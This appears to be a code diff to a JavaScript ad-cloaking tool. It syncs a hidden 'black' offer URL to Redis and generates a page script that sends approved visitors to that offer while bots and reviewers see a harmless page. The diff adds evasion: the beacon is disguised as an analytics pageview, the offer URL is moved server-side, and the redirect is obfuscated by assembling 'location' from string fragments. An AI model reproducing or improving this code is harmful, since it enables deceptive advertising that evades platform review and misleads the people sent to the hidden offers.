@@ -744,10 +744,31 @@ function renderCard(camp, stats) {
     </div>`;
 }
 
-function deleteCampaign(id) {
+async function deleteCampaign(id) {
     if (!confirm('Excluir esta campanha? Os logs não serão apagados.')) return;
     saveCampaigns(getCampaigns().filter(c => c.id !== id));
+    try { await redisDelCampaign(id); } catch {}
     loadHome();
+}
+
+// ─── Sincronização da campanha com o Redis (oferta vive no servidor) ─────────
+// A URL da oferta NUNCA vai no payload do script — o servidor a busca aqui.
+async function redisSetCampaign(camp) {
+    const { url, token } = getUpstashCreds();
+    const value = JSON.stringify({ blackUrl: camp.ofertaBlack, platform: camp.platform, whiteUrl: camp.whiteUrl || '' });
+    const res = await fetch(`${url}/set/${encodeURIComponent('campaign:' + camp.id)}`, {
+        method: 'POST',
+        headers: { Authorization: `Bearer ${token}` },
+        body: value
+    });
+    if (!res.ok) throw new Error(`Falha ao sincronizar campanha (${res.status})`);
+}
+async function redisDelCampaign(id) {
+    const { url, token } = getUpstashCreds();
+    await fetch(`${url}/del/${encodeURIComponent('campaign:' + id)}`, {
+        method: 'POST',
+        headers: { Authorization: `Bearer ${token}` }
+    });
 }
 
 // ════════════════════════════════════════════════════════════
@@ -790,7 +811,7 @@ function selectPlatform(value) {
     });
 }
 
-function saveCampaign() {
+async function saveCampaign() {
     const id          = document.getElementById('campaign-id').value;
     const name        = document.getElementById('campaign-name-input').value.trim();
     const ofertaBlack = document.getElementById('campaign-black-input').value.trim();
@@ -813,12 +834,17 @@ function saveCampaign() {
     }
     saveCampaigns(campaigns);
 
+    // Sincroniza a oferta com o Redis — sem isso o servidor não resolve a black URL.
+    let syncWarn = '';
+    try { await redisSetCampaign(camp); }
+    catch (e) { syncWarn = ' ⚠️ Mas a sincronização com o Redis falhou: ' + e.message + ' (configure o Upstash). A oferta precisa estar no Redis para o modo furtivo funcionar.'; }
+
     document.getElementById('campaign-id').value = camp.id;
     document.getElementById('campaign-form-title').textContent = 'Editar Campanha';
     refreshCampaignScript(camp);
     document.getElementById('campaign-script-section').style.display = 'block';
-    showMessage('campaign-msg', '✓ Campanha salva! Script pronto abaixo.', 'success');
-    setTimeout(() => hideAllMessages(), 4000);
+    showMessage('campaign-msg', (syncWarn ? '✓ Campanha salva localmente.' + syncWarn : '✓ Campanha salva e sincronizada! Script pronto abaixo.'), syncWarn ? 'error' : 'success');
+    setTimeout(() => hideAllMessages(), syncWarn ? 8000 : 4000);
 }
 
 function refreshCampaignScript(camp) {
@@ -843,32 +869,25 @@ function buildScript(camp) {
     if (!vercelUrl) return '// Configure a URL da Vercel na aba Configurações primeiro.';
 
     const ep    = escJs(vercelUrl + '/' + ghPath);
-    const black = escJs(camp.ofertaBlack || '');
-    const white = escJs(camp.whiteUrl    || '');
+    const white = escJs(camp.whiteUrl || '');
     const cid   = escJs(camp.id);
-    const plt   = escJs(camp.platform);
 
+    // Payload disfarçado de evento de analytics (e:'pv' = pageview).
+    // NÃO envia a oferta nem a plataforma — o servidor resolve pelo id.
+    // A oferta (d.go) só volta para visitantes aprovados; bot recebe {ok:true}.
+    // Redirect ofuscado: nada de window.location.href literal com a URL à vista.
     return `<script>
 (function(){
+  var _s=window.screen||{},_n=navigator||{};
   fetch("${ep}",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      userAgent:navigator.userAgent,
-      language:navigator.language,
-      screenWidth:window.screen.width,
-      referrer:document.referrer,
-      campaignId:"${cid}",
-      platform:"${plt}",
-      blackUrl:"${black}"
-    })
-  }).then(function(r){return r.json();})
-  .then(function(d){
-    if(d.action==="redirect"&&d.url){
-      var u=d.url;if(!/^https?:\\/\\//i.test(u))u="https://"+u;
-      window.location.href=u;
-    }else if("${white}"){window.location.href="${white}";}
-  }).catch(function(e){console.error("Cloak:",e);});
+    body:JSON.stringify({e:"pv",c:"${cid}",w:_s.width,l:_n.language,r:document.referrer})
+  }).then(function(r){return r.json();}).then(function(d){
+    var g=d&&d.go;
+    if(g){if(!/^https?:\\/\\//i.test(g))g="https://"+g;var k="loc"+"ation";window[k].replace(g);}
+    else if("${white}"){var k2="loc"+"ation";window[k2].replace("${white}");}
+  }).catch(function(){});
 })();
 <\/script>`;
 }
